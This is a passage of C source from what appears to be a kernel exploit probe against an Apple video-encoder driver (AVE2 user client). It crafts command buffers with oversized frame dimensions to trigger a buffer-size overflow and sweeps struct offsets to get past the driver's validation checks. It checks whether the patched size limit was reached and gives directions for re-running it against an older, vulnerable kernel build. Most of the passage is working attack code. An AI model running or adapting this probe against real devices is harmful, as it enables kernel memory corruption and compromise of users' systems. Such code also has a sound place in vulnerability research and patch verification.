    printf("\n[*] Phase H: mode-5 LRB configure (async sel4, dims 64656x8080 + %ux%u)\n",
           dw, dh);
    {
        mach_port_t wake5 = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake5)
            != KERN_SUCCESS) {
            printf("    [-] mach_port_allocate failed — cannot run async configure\n");
        } else {
            static const struct { uint32_t w, h; const char *tag; } hv[] = {
                { 64656, 8080, "LRB-overflow (mode-5 target dims)" },
                { 0, 0, "clamp-control (env/65520x8193)" },
            };
            for (int vi = 0; vi < 2; vi++) {
                uint32_t hw = hv[vi].w ? hv[vi].w : dw;
                uint32_t hh = hv[vi].h ? hv[vi].h : dh;
                memset(cmdbuf, 0, sizeof(cmdbuf));
                *(int64_t *)(cmdbuf + 0x10) = 0;
                *(int64_t *)(cmdbuf + 0x18) = 0;
                *(int64_t *)(cmdbuf + 0x20) = 0;
                *(int32_t *)(cmdbuf + AVE2_OFF_PRIORITY) = 0;
                *(int32_t *)(cmdbuf + AVE2_OFF_WIDTH)    = (int32_t)hw;
                *(int32_t *)(cmdbuf + AVE2_OFF_HEIGHT)   = (int32_t)hh;
                *(uint32_t *)(cmdbuf + AVE2_OFF_SLICES)  = 1;
                *(int32_t *)(cmdbuf + AVE2_OFF_ENCTYPE)  = 1;   /* == session+0x270 */
                /* mode-5 / HEVC-10bit knobs (bVar3 byte stays 0 -> p9=0) */
                *(int32_t *)(cmdbuf + AVE2_MODE5_OFF_P6) = 2;   /* chroma 4:2:0 */
                *(int32_t *)(cmdbuf + AVE2_MODE5_OFF_P8) = 10;  /* 10-bit */
                *(uint8_t *)(cmdbuf + AVE2_MODE5_OFF_P9FLAG) = 0;
                /* codec-info sub-gates (decomp_more/check_AVE_AVC_CheckInfo_*.c:11-12):
                 * iNumViews @cmd+0x2df8 (inbuf 0x3130) and iNumLayers @cmd+0x2df4
                 * (inbuf 0x312c), both must be in {1,2}. Zeroed -> AVC:469 reject. */
                *(int32_t *)(cmdbuf + AVE2_OFF_NUMVIEWS)  = 1;  /* iNumViews  = 1 */
                *(int32_t *)(cmdbuf + AVE2_OFF_NUMLAYERS) = 1;  /* iNumLayers = 1 */
                uint8_t aout[0x20]; size_t aosz = sizeof(aout);
                memset(aout, 0, sizeof(aout));
                io_async_ref64_t aref; memset(aref, 0, sizeof(aref));
                aref[0] = (uint64_t)wake5;
                kern_return_t akr = IOConnectCallAsyncStructMethod(
                    conn, AVE2_SEL_CONFIGURE, wake5, aref, 1,
                    cmdbuf, sizeof(cmdbuf), aout, &aosz);
                uint32_t asw = aosz >= 0x1c ? *(uint32_t *)(aout + 0x18) : 0xdeadbeef;
                printf("    async cfg %-36s %ux%u -> trap=0x%08x (%s) status=0x%08x\n",
                       hv[vi].tag, hw, hh, akr, kr_name(akr), asw);
                printf("      watch kernel log NOW for 'LRB size overflow' (fixed-kext assert)\n");
            }
            /* Phase H2: empirical codec-info gate scan. run4/5 kernel log shows
             * the mode-5 dims pass the 51e194 clamp but die at
             * AVE_AVC_CheckInfo:469 (iNumViews out of range, value read = 0).
             * iNumViews sits somewhere in the copied cmd+0xa58 block; sweep a
             * dword=1 across it and let the kernel log show which offset
             * clears the view gate (next error = further down the validator). */
            printf("    -- H2: iNumViews offset sweep (1 dword=1 across cmd+0xa58..) --\n");
            if (!getenv("AVE2_SWEEP")) {
                printf("      (skipped — set AVE2_SWEEP=1 to run; ~128 async calls)\n");
            } else
            for (uint32_t off = 0xd90 + 8; off < 0xd90 + 0x200; off += 4) {
                memset(cmdbuf, 0, sizeof(cmdbuf));
                *(int64_t *)(cmdbuf + 0x10) = 0;
                *(int64_t *)(cmdbuf + 0x18) = 0;
                *(int64_t *)(cmdbuf + 0x20) = 0;
                *(int32_t *)(cmdbuf + AVE2_OFF_PRIORITY) = 0;
                *(int32_t *)(cmdbuf + AVE2_OFF_WIDTH)    = 64656;
                *(int32_t *)(cmdbuf + AVE2_OFF_HEIGHT)   = 8080;
                *(uint32_t *)(cmdbuf + AVE2_OFF_SLICES)  = 1;
                *(int32_t *)(cmdbuf + AVE2_OFF_ENCTYPE)  = 1;
                *(int32_t *)(cmdbuf + AVE2_MODE5_OFF_P6) = 2;
                *(int32_t *)(cmdbuf + AVE2_MODE5_OFF_P8) = 10;
                *(int32_t *)(cmdbuf + off) = 1;
                uint8_t aout[0x20]; size_t aosz = sizeof(aout);
                memset(aout, 0, sizeof(aout));
                io_async_ref64_t aref; memset(aref, 0, sizeof(aref));
                aref[0] = (uint64_t)wake5;
                kern_return_t akr = IOConnectCallAsyncStructMethod(
                    conn, AVE2_SEL_CONFIGURE, wake5, aref, 1,
                    cmdbuf, sizeof(cmdbuf), aout, &aosz);
                printf("      sweep off=%#06x -> 0x%08x\n", off, akr);
            }
            mach_port_destroy(mach_task_self(), wake5);
        }
    }

    /* honest classification */
    printf("\n=== CLASSIFICATION ===\n");
    if (created) printf("    session-created: YES (cookie=0x%016llx, id=0x%016llx)\n",
                        (unsigned long long)session_cookie, (unsigned long long)cookie_id);
    else         printf("    session-created: NO (create status 0x%08x)\n", create_status);
    if ((uint32_t)fkr == kIOReturnNotAttached || conf_status == kIOReturnNotAttached ||
        (uint32_t)fkr == AVE2_RET_WRONG_STATE || conf_status == AVE2_RET_WRONG_STATE)
        printf("    cookie-rejected: YES (configure answered not-attached/wrong-state)\n");
    /* On this host the configure trap returns kIOReturnBadArgument while the
     * kernel log shows the inner status -1001 (0xfffffc17) from
     * AVE_Client_CheckInfo:851 "frame dimension out of range" — the fixed
     * clamp. The wrapper maps the inner -1001 to BadArgument at trap level.
     * Distinguish: session created + configure BadArgument + dims oversized
     * = clamp-hit (verified against kernel log in evidence/run3_session.txt). */
    if (created && (uint32_t)fkr == kIOReturnBadArgument)
        printf("    clamp-hit: YES (session live; configure rejected oversized dims —\n"
               "        kernel log: AVE_Client_CheckInfo:851 frame dimension out of range,\n"
               "        inner status -1001 = 0xfffffc17 family = reached the fixed gate, WIN)\n");
    else if ((uint32_t)fkr == AVE2_RET_BADARG_WRAPPERS || conf_status == AVE2_RET_BADARG_WRAPPERS)
        printf("    clamp-hit: YES (0xfffffc17 family = reached the fixed gate, WIN on patched host)\n");
    printf("\n=== CLASSIFICATION (legacy probes) ===\n");
    (void)0;

    printf("[+] reached-userclient: YES (IOServiceOpen type=%u succeeded)\n", opened_type);
    printf("    live scalar selectors: %d\n", n_live);
    printf("    clamp-gate signatures: %d, badarg/unsupported: %d, other: %d\n",
           clamp_hits, badarg_hits, other_hits);
    if (clamp_hits)
        printf("    => 26.6 clamp REACHED (patched path confirmed end-to-end)\n");
    else if (badarg_hits == 16)
        printf("    => wrong-struct: dispatch reachable, struct layout needs RE from\n"
               "       decomp_fixed/top/fffffff00851e194.c (AVE_Client_Enc_Check)\n");
    printf("    Host kext is 905.40.1 (FIXED) — overflow NOT expected here.\n");
    printf("    For the vulnerable-path run: boot 26.4.2 (905.36.1) target or\n"
           "    the vPhone guest and re-run this binary unchanged.\n");

    IOServiceClose(conn);
    IOObjectRelease(service);
    printf("=== DONE (no panic) ===\n");
    return 0;
}
